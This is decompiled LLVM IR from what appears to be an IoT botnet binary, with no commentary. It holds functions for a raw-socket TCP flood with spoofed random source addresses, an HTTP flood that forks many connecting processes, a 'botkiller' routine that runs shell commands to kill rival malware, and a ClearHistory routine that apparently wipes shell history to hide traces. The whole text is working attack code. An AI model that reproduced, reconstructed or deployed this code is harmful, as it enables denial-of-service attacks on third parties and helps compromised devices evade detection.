  store i32 %v1_fe78, i32* %r3.global-to-local, align 4
  %v1_fe7c = trunc i32 %v1_fe78 to i8
  store i8 %v1_fe7c, i8* %v2_fe44, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_fe84:                                ; preds = %dec_label_pc_fe54
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c5d8.579 to i32), i32* @r1, align 4
  %v4_fe90 = call i32 @__GI_strcoll(i8* %v3_fe30, i32 ptrtoint ([4 x i8]* @global_var_1c5d8.579 to i32))
  store i32 %v4_fe90, i32* %r3.global-to-local, align 4
  %v2_fe98 = icmp eq i32 %v4_fe90, 0
  br i1 %v2_fe98, label %dec_label_pc_fea0, label %dec_label_pc_feb4

dec_label_pc_fea0:                                ; preds = %dec_label_pc_fe84
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v3_fea4 = load i8, i8* %v2_fe44, align 1
  %v4_fea4 = zext i8 %v3_fea4 to i32
  %v1_fea8 = or i32 %v4_fea4, 1
  store i32 %v1_fea8, i32* %r3.global-to-local, align 4
  %v1_feac = trunc i32 %v1_fea8 to i8
  store i8 %v1_feac, i8* %v2_fe44, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_feb4:                                ; preds = %dec_label_pc_fe84
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c5dc.581 to i32), i32* @r1, align 4
  %v4_fec0 = call i32 @__GI_strcoll(i8* %v3_fe30, i32 ptrtoint ([4 x i8]* @global_var_1c5dc.581 to i32))
  store i32 %v4_fec0, i32* %r3.global-to-local, align 4
  %v2_fec8 = icmp eq i32 %v4_fec0, 0
  br i1 %v2_fec8, label %dec_label_pc_fed0, label %dec_label_pc_fee4

dec_label_pc_fed0:                                ; preds = %dec_label_pc_feb4
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v3_fed4 = load i8, i8* %v2_fe44, align 1
  %v4_fed4 = zext i8 %v3_fed4 to i32
  %v1_fed8 = or i32 %v4_fed4, 16
  store i32 %v1_fed8, i32* %r3.global-to-local, align 4
  %v1_fedc = trunc i32 %v1_fed8 to i8
  store i8 %v1_fedc, i8* %v2_fe44, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_fee4:                                ; preds = %dec_label_pc_feb4
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c5e0.583 to i32), i32* @r1, align 4
  %v4_fef0 = call i32 @__GI_strcoll(i8* %v3_fe30, i32 ptrtoint ([4 x i8]* @global_var_1c5e0.583 to i32))
  store i32 %v4_fef0, i32* %r3.global-to-local, align 4
  %v2_fef8 = icmp eq i32 %v4_fef0, 0
  br i1 %v2_fef8, label %dec_label_pc_ff00, label %dec_label_pc_ff14

dec_label_pc_ff00:                                ; preds = %dec_label_pc_fee4
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v3_ff04 = load i8, i8* %v2_fe44, align 1
  %v4_ff04 = zext i8 %v3_ff04 to i32
  %v1_ff08 = or i32 %v4_ff04, 8
  store i32 %v1_ff08, i32* %r3.global-to-local, align 4
  %v1_ff0c = trunc i32 %v1_ff08 to i8
  store i8 %v1_ff0c, i8* %v2_fe44, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_ff14:                                ; preds = %dec_label_pc_fee4
  %v2_ff18 = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_ff18, i32* %r3.global-to-local, align 4
  store i32 %storemerge1421, i32* @r2, align 4
  %v3_ff28 = call i32 @sockprintf(i32 %v2_ff18, i32 ptrtoint ([18 x i8]* @global_var_1c5e4.585 to i32))
  br label %dec_label_pc_ff2c

dec_label_pc_ff2c:                                ; preds = %dec_label_pc_ff00, %dec_label_pc_fed0, %dec_label_pc_fea0, %dec_label_pc_fe70, %dec_label_pc_fe40, %dec_label_pc_ff14
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_ff34 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  store i32 %v2_ff34, i32* %r3.global-to-local, align 4
  %v2_ff44 = icmp eq i32 %v2_ff34, 0
  br i1 %v2_ff44, label %dec_label_pc_ff4c, label %dec_label_pc_fe24

dec_label_pc_ff4c:                                ; preds = %dec_label_pc_ff2c, %dec_label_pc_fe08, %dec_label_pc_fdb4
  %v0_ff4c = call i32 @rand_cmwc()
  %v3_ff58 = urem i32 %v0_ff4c, 65536
  store i32 %v3_ff58, i32* %r3.global-to-local, align 4
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v1_ff60 = trunc i32 %v0_ff4c to i8
  %v3_ff60 = add i32 %v3_fcd8, 34
  %v4_ff60 = inttoptr i32 %v3_ff60 to i8*
  store i8 %v1_ff60, i8* %v4_ff60, align 2
  %v0_ff64 = load i32, i32* %r3.global-to-local, align 4
  %v3_ff6425 = udiv i32 %v0_ff64, 256
  %v1_ff68 = trunc i32 %v3_ff6425 to i8
  %v2_ff68 = load i32, i32* %r2.global-to-local, align 4
  %v3_ff68 = add i32 %v2_ff68, 15
  %v4_ff68 = inttoptr i32 %v3_ff68 to i8*
  store i8 %v1_ff68, i8* %v4_ff68, align 1
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ff74 = add i32 %v3_fcd8, 36
  %v4_ff74 = inttoptr i32 %v3_ff74 to i8*
  store i8 0, i8* %v4_ff74, align 4
  %v0_ff78 = load i32, i32* %r3.global-to-local, align 4
  %v1_ff78 = trunc i32 %v0_ff78 to i8
  %v2_ff78 = load i32, i32* %r2.global-to-local, align 4
  %v3_ff78 = add i32 %v2_ff78, 17
  %v4_ff78 = inttoptr i32 %v3_ff78 to i8*
  store i8 %v1_ff78, i8* %v4_ff78, align 1
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ff84 = add i32 %v3_fcd8, 38
  %v4_ff84 = inttoptr i32 %v3_ff84 to i8*
  store i8 0, i8* %v4_ff84, align 2
  %v0_ff88 = load i32, i32* %r3.global-to-local, align 4
  %v1_ff88 = trunc i32 %v0_ff88 to i8
  %v2_ff88 = load i32, i32* %r2.global-to-local, align 4
  %v3_ff88 = add i32 %v2_ff88, 19
  %v4_ff88 = inttoptr i32 %v3_ff88 to i8*
  store i8 %v1_ff88, i8* %v4_ff88, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_fb64, label %dec_label_pc_ff98, label %dec_label_pc_ffb0

dec_label_pc_ff98:                                ; preds = %dec_label_pc_ff4c
  %v0_ff98 = call i32 @rand_cmwc()
  %v3_ffa0 = mul i32 %v0_ff98, 65536
  store i32 %v3_ffa0, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_ff98 to i8
  br label %dec_label_pc_ffcc

dec_label_pc_ffb0:                                ; preds = %dec_label_pc_ff4c
  %v3_ffb8 = urem i32 %arg2, 65536
  store i32 %v3_ffb8, i32* %r3.global-to-local, align 4
  %v1_ffc0 = call i32 @htons(i32 %v3_ffb8)
  %extract.t71 = trunc i32 %v1_ffc0 to i8
  br label %dec_label_pc_ffcc

dec_label_pc_ffcc:                                ; preds = %dec_label_pc_ff98, %dec_label_pc_ffb0
  %v0_ff98.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_ff98 ], [ %extract.t71, %dec_label_pc_ffb0 ]
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v4_ffd0 = sext i8 %v0_ff98.sink.off0 to i32
  %v3_ffd4 = add i32 %v3_fcd8, 22
  %v4_ffd4 = inttoptr i32 %v3_ffd4 to i8*
  store i8 %v0_ff98.sink.off0, i8* %v4_ffd4, align 2
  %v3_ffdc = sdiv i32 %v4_ffd0, 256
  %v4_ffdc = trunc i32 %v3_ffdc to i8
  store i32 %v3_ffdc, i32* %r3.global-to-local, align 4
  %v4_ffe0 = add i32 %v3_fcd8, 23
  %v5_ffe0 = inttoptr i32 %v4_ffe0 to i8*
  store i8 %v4_ffdc, i8* %v5_ffe0, align 1
  %v5_ffec = call i32 @tcpcsum(i32 %v3_fcd8, i32 %v1_fcf8, i32 %v1_fcf8, i32 %v3_ffdc)
  %sext = mul i32 %v5_ffec, 16777216
  %v1_fff0 = sdiv i32 %sext, 16777216
  store i32 %v1_fff0, i32* %r3.global-to-local, align 4
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v1_fff8 = trunc i32 %v1_fff0 to i8
  store i8 %v1_fff8, i8* %v4_ff74, align 4
  %v0_fffc = load i32, i32* %r3.global-to-local, align 4
  %v3_fffc28 = udiv i32 %v0_fffc, 256
  %v1_10000 = trunc i32 %v3_fffc28 to i8
  %v2_10000 = load i32, i32* %r2.global-to-local, align 4
  %v3_10000 = add i32 %v2_10000, 17
  %v4_10000 = inttoptr i32 %v3_10000 to i8*
  store i8 %v1_10000, i8* %v4_10000, align 1
  %v1_10010 = or i32 %v3_fcd8, 2
  store i32 %v1_10010, i32* %r3.global-to-local, align 4
  %v1_10014 = inttoptr i32 %v1_10010 to i8*
  %v2_10014 = load i8, i8* %v1_10014, align 2
  %v3_10014 = zext i8 %v2_10014 to i32
  store i32 %v3_10014, i32* %r2.global-to-local, align 4
  %v1_10018 = or i32 %v1_fcd4, 3
  %v2_10018 = inttoptr i32 %v1_10018 to i8*
  %v3_10018 = load i8, i8* %v2_10018, align 1
  %v4_10018 = zext i8 %v3_10018 to i32
  %v4_1001c = mul nuw nsw i32 %v4_10018, 256
  %v5_1001c = or i32 %v4_1001c, %v3_10014
  store i32 %v5_1001c, i32* %r3.global-to-local, align 4
  %v3_10028 = call i32 @csum(i8* %v4_fd34, i32 %v5_1001c)
  %sext4 = mul i32 %v3_10028, 16777216
  %v1_1002c = sdiv i32 %sext4, 16777216
  store i32 %v1_1002c, i32* %r3.global-to-local, align 4
  store i32 %v3_fcd8, i32* %r2.global-to-local, align 4
  %v1_10034 = trunc i32 %v1_1002c to i8
  %v3_10034 = add i32 %v3_fcd8, 10
  %v4_10034 = inttoptr i32 %v3_10034 to i8*
  store i8 %v1_10034, i8* %v4_10034, align 2
  %v0_10038 = load i32, i32* %r3.global-to-local, align 4
  %v3_10038 = sdiv i32 %v0_10038, 256
  store i32 %v3_10038, i32* %r3.global-to-local, align 4
  %v1_1003c = trunc i32 %v3_10038 to i8
  %v2_1003c = load i32, i32* %r2.global-to-local, align 4
  %v3_1003c = add i32 %v2_1003c, 11
  %v4_1003c = inttoptr i32 %v3_1003c to i8*
  store i8 %v1_1003c, i8* %v4_1003c, align 1
  %v2_10044 = call i32 @__GI_time(i32* null)
  %v2_10050 = add i32 %v2_10044, %arg3
  store i32 %v2_10050, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_100a8 = add i32 %v3_fcd8, 12
  %v3_100a8 = inttoptr i32 %v2_100a8 to i32*
  %v3_100c0 = add i32 %v3_fcd8, 4
  %v4_100c0 = inttoptr i32 %v3_100c0 to i8*
  %v4_10108 = add i32 %v3_fcd8, 37
  %v5_10108 = inttoptr i32 %v4_10108 to i8*
  br label %dec_label_pc_10064

dec_label_pc_10064:                               ; preds = %dec_label_pc_1019c, %dec_label_pc_10190, %dec_label_pc_ffcc
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_ffcc ], [ 0, %dec_label_pc_10190 ], [ %v1_101a0, %dec_label_pc_1019c ]
  store i32 %v3_fcd8, i32* %r2.global-to-local, align 4
  %v1_1006c = load i32, i32* @sp, align 4
  %v2_1006c = inttoptr i32 %v1_1006c to i32*
  store i32 %v2_fbd4, i32* %v2_1006c, align 4
  %v1_10074 = load i32, i32* @sp, align 4
  %v2_10074 = add i32 %v1_10074, 4
  %v3_10074 = inttoptr i32 %v2_10074 to i32*
  store i32 16, i32* %v3_10074, align 4
  %v0_1007c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_fca8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_10088 = inttoptr i32 %v0_1007c to i32*
  %v7_10088 = call i32 @__libc_sendto(i32 %v0_fbf8, i32* %v6_10088, i32 %v1_fca8, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_10090 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_10090, i32* %r3.global-to-local, align 4
  %v1_1009c = call i32 @htonl(i32 %v1_10090)
  store i32 %v1_1009c, i32* %r2.global-to-local, align 4
  store i32 %v3_fcd8, i32* %r3.global-to-local, align 4
  store i32 %v1_1009c, i32* %v3_100a8, align 4
  %v0_100ac = call i32 @rand_cmwc()
  %v3_100b8 = urem i32 %v0_100ac, 65536
  store i32 %v3_100b8, i32* %r3.global-to-local, align 4
  store i32 %v3_fcd8, i32* %r2.global-to-local, align 4
  %v1_100c0 = trunc i32 %v0_100ac to i8
  store i8 %v1_100c0, i8* %v4_100c0, align 4
  %v0_100c4 = load i32, i32* %r3.global-to-local, align 4
  %v3_100c4 = sdiv i32 %v0_100c4, 256
  store i32 %v3_100c4, i32* %r3.global-to-local, align 4
  %v1_100c8 = trunc i32 %v3_100c4 to i8
  %v2_100c8 = load i32, i32* %r2.global-to-local, align 4
  %v3_100c8 = add i32 %v2_100c8, 5
  %v4_100c8 = inttoptr i32 %v3_100c8 to i8*
  store i8 %v1_100c8, i8* %v4_100c8, align 1
  %v0_100cc = call i32 @rand_cmwc()
  store i32 %v0_100cc, i32* %r2.global-to-local, align 4
  store i32 %v1_fcf8, i32* %r3.global-to-local, align 4
  store i32 %v0_100cc, i32* %v3_fd64, align 4
  %v0_100dc = call i32 @rand_cmwc()
  %v3_100e8 = urem i32 %v0_100dc, 65536
  store i32 %v3_100e8, i32* %r3.global-to-local, align 4
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v1_100f0 = trunc i32 %v0_100dc to i8
  store i8 %v1_100f0, i8* %v5_fcfc, align 4
  %v0_100f4 = load i32, i32* %r3.global-to-local, align 4
  %v3_100f429 = udiv i32 %v0_100f4, 256
  %v1_100f8 = trunc i32 %v3_100f429 to i8
  %v2_100f8 = load i32, i32* %r2.global-to-local, align 4
  %v3_100f8 = add i32 %v2_100f8, 1
  %v4_100f8 = inttoptr i32 %v3_100f8 to i8*
  store i8 %v1_100f8, i8* %v4_100f8, align 1
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_ff74, align 4
  store i8 0, i8* %v5_10108, align 1
  %v5_10114 = call i32 @tcpcsum(i32 %v3_fcd8, i32 %v1_fcf8, i32 %v1_fcf8, i32 0)
  %sext5 = mul i32 %v5_10114, 16777216
  %v1_10118 = sdiv i32 %sext5, 16777216
  store i32 %v1_10118, i32* %r3.global-to-local, align 4
  store i32 %v1_fcf8, i32* %r2.global-to-local, align 4
  %v1_10120 = trunc i32 %v1_10118 to i8
  store i8 %v1_10120, i8* %v4_ff74, align 4
  %v0_10124 = load i32, i32* %r3.global-to-local, align 4
  %v3_1012430 = udiv i32 %v0_10124, 256
  %v1_10128 = trunc i32 %v3_1012430 to i8
  %v2_10128 = load i32, i32* %r2.global-to-local, align 4
  %v3_10128 = add i32 %v2_10128, 17
  %v4_10128 = inttoptr i32 %v3_10128 to i8*
  store i8 %v1_10128, i8* %v4_10128, align 1
  store i32 %v1_10010, i32* %r3.global-to-local, align 4
  %v2_1013c = load i8, i8* %v1_10014, align 2
  %v3_1013c = zext i8 %v2_1013c to i32
  store i32 %v3_1013c, i32* %r2.global-to-local, align 4
  %v3_10140 = load i8, i8* %v2_10018, align 1
  %v4_10140 = zext i8 %v3_10140 to i32
  %v4_10144 = mul nuw nsw i32 %v4_10140, 256
  %v5_10144 = or i32 %v4_10144, %v3_1013c
  store i32 %v5_10144, i32* %r3.global-to-local, align 4
  %v3_10150 = call i32 @csum(i8* %v4_fd34, i32 %v5_10144)
  %sext6 = mul i32 %v3_10150, 16777216
  %v1_10154 = sdiv i32 %sext6, 16777216
  store i32 %v1_10154, i32* %r3.global-to-local, align 4
  store i32 %v3_fcd8, i32* %r2.global-to-local, align 4
  %v1_1015c = trunc i32 %v1_10154 to i8
  store i8 %v1_1015c, i8* %v4_10034, align 2
  %v0_10160 = load i32, i32* %r3.global-to-local, align 4
  %v3_1016031 = udiv i32 %v0_10160, 256
  %v1_10164 = trunc i32 %v3_1016031 to i8
  %v2_10164 = load i32, i32* %r2.global-to-local, align 4
  %v3_10164 = add i32 %v2_10164, 11
  %v4_10164 = inttoptr i32 %v3_10164 to i8*
  store i8 %v1_10164, i8* %v4_10164, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_10170 = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_10170, label %dec_label_pc_10178, label %dec_label_pc_1019c

dec_label_pc_10178:                               ; preds = %dec_label_pc_10064
  %v2_1017c = call i32 @__GI_time(i32* null)
  store i32 %v2_1017c, i32* %r2.global-to-local, align 4
  store i32 %v2_10050, i32* %r3.global-to-local, align 4
  %v8_1018c = icmp sgt i32 %v2_1017c, %v2_10050
  br i1 %v8_1018c, label %dec_label_pc_101ac, label %dec_label_pc_10190

dec_label_pc_10190:                               ; preds = %dec_label_pc_10178
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10064

dec_label_pc_1019c:                               ; preds = %dec_label_pc_10064
  %v1_101a0 = add i32 %stack_var_-88.0, 1
  store i32 %v1_101a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10064

dec_label_pc_101ac:                               ; preds = %dec_label_pc_10178, %dec_label_pc_fbb0, %dec_label_pc_fc5c, %dec_label_pc_fc10
  %v12_101b4 = phi i32 [ %v3_fbc0, %dec_label_pc_fbb0 ], [ %v3_fc6c, %dec_label_pc_fc5c ], [ %v3_fc20, %dec_label_pc_fc10 ], [ %v2_1017c, %dec_label_pc_10178 ]
  store i32 %v3_fb24, i32* @r4, align 4
  store i32 %v6_fb24, i32* @fp, align 4
  ret i32 %v12_101b4

; uselistorder directives
  uselistorder i32 %v1_101a0, { 1, 0 }
  uselistorder i32 %v1_10154, { 1, 0 }
  uselistorder i32 %v1_10118, { 1, 0 }
  uselistorder i32 %v0_100dc, { 1, 0 }
  uselistorder i32 %v3_100c4, { 1, 0 }
  uselistorder i32 %v0_100ac, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_10050, { 1, 0, 2 }
  uselistorder i32 %v3_10038, { 1, 0 }
  uselistorder i32 %v1_1002c, { 1, 0 }
  uselistorder i32 %v1_10010, { 0, 2, 1 }
  uselistorder i32 %v1_fff0, { 1, 0 }
  uselistorder i32 %v3_ffdc, { 2, 0, 1 }
  uselistorder i8 %v0_ff98.sink.off0, { 1, 0 }
  uselistorder i32 %v3_ffb8, { 1, 0 }
  uselistorder i32 %v0_ff98, { 1, 0 }
  uselistorder i32 %v0_ff4c, { 1, 0 }
  uselistorder i32 %v2_ff34, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_fe44, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_fdb8, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_fd50, { 1, 0 }
  uselistorder i32 %v0_fd38, { 1, 0 }
  uselistorder i32 %v1_fcf8, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_fcd8, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_fca8, { 1, 0 }
  uselistorder i32 %v3_fb94, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 11, 12, 8, 9, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 25, 22, 23, 27, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 54, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 48, 50, 49, 51, 53, 52, 83, 55, 56, 57, 58, 59, 60, 63, 61, 62, 64, 65, 66, 67, 69, 68, 70, 71, 72, 74, 73, 75, 76, 77, 79, 78, 80, 81, 82, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_101ac, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_ffcc, { 1, 0 }
  uselistorder label %dec_label_pc_ff2c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_fe24, { 1, 0 }
  uselistorder label %dec_label_pc_fca4, { 1, 0 }
  uselistorder label %dec_label_pc_fbb0, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %v2_101f0 = ptrtoint i8** %stack_var_-100 to i32
  %v2_1023c = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_101f4

dec_label_pc_101f4:                               ; preds = %dec_label_pc_102cc, %entry
  br label %dec_label_pc_10200

dec_label_pc_10200:                               ; preds = %dec_label_pc_101f4, %dec_label_pc_10200
  %storemerge45 = phi i32 [ 0, %dec_label_pc_101f4 ], [ %v1_102b8, %dec_label_pc_10200 ]
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v4_1022c = mul nuw nsw i32 %storemerge45, 4
  %v5_1022c = add i32 %v4_1022c, ptrtoint ([87 x i8*]* @global_var_262c4.674 to i32)
  %v6_1022c = inttoptr i32 %v5_1022c to i32*
  %v7_1022c = load i32, i32* %v6_1022c, align 4
  store i32 %v7_1022c, i32* @r1, align 4
  %v3_1023c = call i32 @strcat(i8* %v2_1023c, i32 %v7_1022c)
  %v1_10248 = call i32 @__libc_system(i32 %v2_101f0)
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v7_10284 = load i32, i32* %v6_1022c, align 4
  store i32 %v7_10284, i32* @r1, align 4
  %v3_10294 = call i32 @strcat(i8* %v2_1023c, i32 %v7_10284)
  store i32 ptrtoint (i32* @global_var_1c610.680 to i32), i32* @r1, align 4
  %v3_102a4 = call i32 @strcat(i8* %v2_1023c, i32 ptrtoint (i32* @global_var_1c610.680 to i32))
  %v1_102b0 = call i32 @__libc_system(i32 %v2_101f0)
  %v1_102b8 = add nuw nsw i32 %storemerge45, 1
  %v7_102c8 = icmp slt i32 %v1_102b8, 9
  br i1 %v7_102c8, label %dec_label_pc_10200, label %dec_label_pc_102cc

dec_label_pc_102cc:                               ; preds = %dec_label_pc_10200
  %v1_102d0 = call i32 @sleep(i32 5)
  br label %dec_label_pc_101f4

; uselistorder directives
  uselistorder i32 %storemerge45, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 50, { 0, 2, 1 }
  uselistorder i32 49, { 0, 1, 3, 2 }
  uselistorder [3 x i8]* @global_var_1af38.41, { 1, 0 }
  uselistorder label %dec_label_pc_10200, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v2_102f8 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1c614.682 to i32))
  %v2_10300 = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_1c62c.684 to i32))
  %v2_10308 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_1c64c.686 to i32))
  ret i32 %v2_10308

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 4, 3, 2, 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-584 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_10320 = load i32, i32* @r4, align 4
  store i32 %v3_10320, i32* %stack_var_-20, align 4
  %v6_10320 = load i32, i32* @fp, align 4
  store i32 66344, i32* %stack_var_-4, align 4
  %v16_10320 = ptrtoint i32* %stack_var_-20 to i32
  %v2_10324 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10324, i32* @fp, align 4
  %v2_10374 = call i32 @__GI_time(i32* null)
  %v3_1037c = load i32, i32* %stack_var_0, align 4
  %v2_10380 = add i32 %v3_1037c, %v2_10374
  %v0_10388 = call i32 @random()
  %v2_10398 = srem i32 %v0_10388, 3
  %v3_103a4 = mul nsw i32 %v2_10398, 4
  %v2_103ac = add i32 %v16_10320, -52
  %v2_103b0 = add i32 %v2_103ac, %v3_103a4
  %v1_103b4 = inttoptr i32 %v2_103b0 to i32*
  %v2_103b4 = load i32, i32* %v1_103b4, align 4
  store i32 %v2_103b4, i32* @r4, align 4
  %v0_103b8 = call i32 @random()
  %v2_103c8 = srem i32 %v0_103b8, 7
  %v3_103d4 = mul nsw i32 %v2_103c8, 4
  %v2_103dc = add i32 %v16_10320, -40
  %v2_103e0 = add i32 %v2_103dc, %v3_103d4
  %v1_103e4 = inttoptr i32 %v2_103e0 to i32*
  %v2_103e4 = load i32, i32* %v1_103e4, align 4
  %v2_103e8 = ptrtoint i32* %stack_var_-584 to i32
  %v0_103ec = load i32, i32* @r4, align 4
  store i32 %v2_103e8, i32* @r0, align 4
  %v7_10404 = call i32 @sprintf(i32 %v2_103e8, i32 ptrtoint ([62 x i8]* @global_var_1c880.710 to i32), i32 %arg2, i32 %arg4, i32 %v0_103ec, i32 %v2_103e4)
  br label %dec_label_pc_104b0

dec_label_pc_10414:                               ; preds = %dec_label_pc_104b0
  %v0_10414 = call i32 @__libc_fork()
  %v2_1041c = icmp eq i32 %v0_10414, 0
  %v1_104a8 = add nuw i32 %storemerge2, 1
  br i1 %v2_1041c, label %dec_label_pc_104b0, label %dec_label_pc_10484.preheader

dec_label_pc_10484.preheader:                     ; preds = %dec_label_pc_10414
  %tmp33 = bitcast i32* %stack_var_-584 to i8*
  br label %dec_label_pc_10484

dec_label_pc_10428:                               ; preds = %dec_label_pc_10484
  %v5_10444 = call i32 @socket_connect(i32 %arg1, i8 %arg3, i32 %tmp)
  %v2_10454 = icmp eq i32 %v5_10444, 0
  br i1 %v2_10454, label %dec_label_pc_10484, label %dec_label_pc_1045c

dec_label_pc_1045c:                               ; preds = %dec_label_pc_10428
  %v3_10464 = call i32 @strlen(i8* %tmp33)
  store i32 %v3_10464, i32* @r2, align 4
  %v3_10478 = call i32 @__libc_write(i32 %v5_10444, i32* nonnull %stack_var_-584)
  %v1_10480 = call i32 @__libc_close(i32 %v5_10444)
  br label %dec_label_pc_10484

dec_label_pc_10484:                               ; preds = %dec_label_pc_10428, %dec_label_pc_1045c, %dec_label_pc_10484.preheader
  %v2_10488 = call i32 @__GI_time(i32* null)
  %v5_10498 = icmp slt i32 %v2_10488, %v2_10380
  br i1 %v5_10498, label %dec_label_pc_10428, label %dec_label_pc_1049c

dec_label_pc_1049c:                               ; preds = %dec_label_pc_10484
  %v1_104a0 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_104b0:                               ; preds = %dec_label_pc_10414, %entry
  %v12_104c4 = phi i32 [ %v7_10404, %entry ], [ 0, %dec_label_pc_10414 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_104a8, %dec_label_pc_10414 ]
  %v5_104bc = icmp slt i32 %storemerge2, %arg6
  br i1 %v5_104bc, label %dec_label_pc_10414, label %dec_label_pc_104c0

dec_label_pc_104c0:                               ; preds = %dec_label_pc_104b0
  %v2_104c4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_104c4, i32* @r4, align 4
  store i32 %v6_10320, i32* @fp, align 4
  ret i32 %v12_104c4

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %v5_10444, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
